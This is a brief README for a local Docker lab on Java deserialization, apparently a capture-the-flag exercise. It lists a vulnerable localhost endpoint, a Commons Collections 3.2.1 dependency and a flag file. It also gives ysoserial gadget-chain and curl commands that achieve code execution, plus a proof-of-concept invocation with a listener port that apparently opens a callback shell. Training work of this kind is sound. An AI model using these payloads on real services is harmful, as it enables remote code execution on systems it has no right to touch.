# Java Deserialization Lab (Docker)

```bash
./labctl.sh up --profile heavy java-deserial
```

- URL: http://127.0.0.1:8111/vulnerable
- POST raw Java serialized stream (ysoserial output)
- Cookie alternative: `session=<base64 payload>`
- Commons Collections **3.2.1** on classpath
- Flag: `/flag.txt`

```bash
# generate with ysoserial then:
java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned' > /tmp/p.bin
curl -X POST --data-binary @/tmp/p.bin http://127.0.0.1:8111/vulnerable

python3 ../poc.py 127.0.0.1 8111 127.0.0.1 4444 --endpoint /vulnerable
```
